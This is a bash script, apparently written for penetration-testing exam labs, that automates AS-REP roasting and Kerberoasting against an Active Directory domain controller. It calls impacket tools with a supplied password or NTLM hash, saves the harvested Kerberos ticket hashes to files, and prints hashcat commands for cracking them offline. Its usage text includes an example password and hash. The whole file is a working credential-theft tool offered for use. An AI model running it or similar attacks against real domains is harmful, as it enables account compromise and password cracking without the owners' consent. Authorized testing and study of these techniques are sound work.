#!/usr/bin/env bash
set -euo pipefail

readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly CYAN='\033[0;36m'
readonly MAGENTA='\033[0;35m'
readonly NC='\033[0m'

USER=""
PASS=""
HASH=""
IP=""
DOMAIN=""

usage() {
    echo -e "${RED}[!] Usage: $0 -u <USERNAME> [-p <PASSWORD> | -H <HASH>] -t <DC_IP> -d <DOMAIN>${NC}" >&2
    echo "Example with password: $0 -u Lucy -p 'VodkaMartini' -t 192.168.24.123 -d offsec.exam"
    echo "Example with hash: $0 -u Lucy -H 'aad3b435b51404eeaad3b435b51404ee:64fbae31cc352fc26af97cbdef151e03' -t 192.168.24.123 -d offsec.exam"
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -u) USER="$2"; shift 2 ;;
        -p) PASS="$2"; shift 2 ;;
        -H) HASH="$2"; shift 2 ;;
        -t) IP="$2"; shift 2 ;;
        -d) DOMAIN="$2"; shift 2 ;;
        *) usage ;;
    esac
done

[[ -z "$USER" ]] && read -rp "Enter username: " USER
[[ -z "$IP" ]] && read -rp "Enter target DC IP (-t): " IP
[[ -z "$DOMAIN" ]] && read -rp "Enter domain: " DOMAIN

if [[ -z "$PASS" && -z "$HASH" ]]; then
    read -rp "Enter password (leave blank to use hash): " PASS
    echo ""
    [[ -z "$PASS" ]] && read -rp "Enter NTLM hash: " HASH
fi

[[ -z "$USER" || -z "$IP" || -z "$DOMAIN" ]] && usage
[[ -z "$PASS" && -z "$HASH" ]] && { echo -e "${RED}[!] Must provide either password or hash${NC}" >&2; usage; }
[[ -n "$PASS" && -n "$HASH" ]] && { echo -e "${RED}[!] Cannot use both password and hash${NC}" >&2; usage; }

section_header() {
    local title="$1"
    local width=60
    local padding=$(( (width - ${#title} - 2) / 2 ))
    local line
    line=$(printf '%*s' "$width" '' | tr ' ' '=')
    echo
    echo -e "${CYAN}${line}${NC}"
    echo -e "${CYAN}$(printf '%*s' "$padding" '')${title}${NC}"
    echo -e "${CYAN}${line}${NC}"
    echo
}

log_info() { echo -e "${BLUE}[*]${NC} $*"; }
log_success() { echo -e "${GREEN}[+]${NC} $*"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $*"; }
log_error() { echo -e "${RED}[-]${NC} $*"; }

echo "Select mode:"
echo "  1) AS-REP roasting"
echo "  2) Kerberoasting"
echo "  3) Both attacks"
read -rp "Choice [1/2/3]: " MODE
echo ""

section_header "HINTS"
echo -e "${YELLOW}[!] Crack AS-REP hashes:${NC} hashcat -m 18200 hashes.txt wordlist.txt"
echo -e "${YELLOW}[!] Crack Kerberoast hashes:${NC} hashcat -m 13100 hashes.txt wordlist.txt"
echo -e "${YELLOW}[!] Extract hashes:${NC} grep '\$krb5' file.log > hashes.txt"
echo ""

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTDIR="results_auth_kerberos/${DOMAIN}_${TIMESTAMP}"
mkdir -p "$OUTDIR"

AUTH_TYPE="password"
[[ -n "$HASH" ]] && AUTH_TYPE="hash"

log_info "Output directory: ${MAGENTA}${OUTDIR}${NC}"
log_info "Target: DC=${MAGENTA}${IP}${NC} | Domain=${MAGENTA}${DOMAIN}${NC} | User=${MAGENTA}${USER}${NC} | Auth=${MAGENTA}${AUTH_TYPE}${NC}"
echo ""

CRED_ARG="$DOMAIN/$USER"
EXTRA_ARGS=()
if [[ -n "$PASS" ]]; then
    CRED_ARG="$DOMAIN/$USER:$PASS"
elif [[ -n "$HASH" ]]; then
    EXTRA_ARGS=("-hashes" "$HASH")
fi

perform_attack() {
    local tool="$1"
    local pattern="$2"
    local logfile="$3"
    local hashfile="$4"
    local title="$5"
    section_header "$title"
    log_info "Searching for target accounts..."
    echo ""
    if "$tool" "$CRED_ARG" -dc-ip "$IP" "${EXTRA_ARGS[@]}" -request 2>&1 | tee "$logfile"; then
        echo ""
        if grep -q "$pattern" "$logfile" 2>/dev/null; then
            grep "$pattern" "$logfile" > "$hashfile"
            local count
            count=$(wc -l < "$hashfile")
            log_success "Found ${GREEN}${count}${NC} account(s)"
            log_success "Hashes saved to: ${GREEN}${hashfile}${NC}"
        else
            log_warning "No accounts found"
        fi
    else
        log_error "Attack failed - check credentials or connectivity"
    fi
}

asrep_roast() {
    perform_attack "impacket-GetNPUsers" '\$krb5asrep\$' "$OUTDIR/asrep_roasting.log" "$OUTDIR/asrep_hashes.txt" "AS-REP ROASTING"
}

kerberoast() {
    perform_attack "impacket-GetUserSPNs" '\$krb5tgs\$' "$OUTDIR/kerberoasting.log" "$OUTDIR/kerberoast_hashes.txt" "KERBEROASTING"
}

case "$MODE" in
    1) asrep_roast ;;
    2) kerberoast ;;
    3) asrep_roast; kerberoast ;;
    *) log_error "Invalid mode"; exit 1 ;;
esac

section_header "ENUMERATION SUMMARY"
log_success "Results saved to: ${GREEN}${OUTDIR}/${NC}"
echo ""

HAS_RESULTS=false
if [[ -f "$OUTDIR/asrep_hashes.txt" ]] && [[ -s "$OUTDIR/asrep_hashes.txt" ]]; then
    ASREP_COUNT=$(wc -l < "$OUTDIR/asrep_hashes.txt")
    log_success "AS-REP hashes: ${GREEN}${ASREP_COUNT} found${NC} → ${OUTDIR}/asrep_hashes.txt"
    HAS_RESULTS=true
fi

if [[ -f "$OUTDIR/kerberoast_hashes.txt" ]] && [[ -s "$OUTDIR/kerberoast_hashes.txt" ]]; then
    KERB_COUNT=$(wc -l < "$OUTDIR/kerberoast_hashes.txt")
    log_success "Kerberoast hashes: ${GREEN}${KERB_COUNT} found${NC} → ${OUTDIR}/kerberoast_hashes.txt"
    HAS_RESULTS=true
fi

[[ "$HAS_RESULTS" = false ]] && log_warning "No hashes found in this enumeration"
echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "  → Crack AS-REP hashes: hashcat -m 18200 asrep_hashes.txt wordlist.txt"
echo "  → Crack Kerberoast hashes: hashcat -m 13100 kerberoast_hashes.txt wordlist.txt"
echo ""
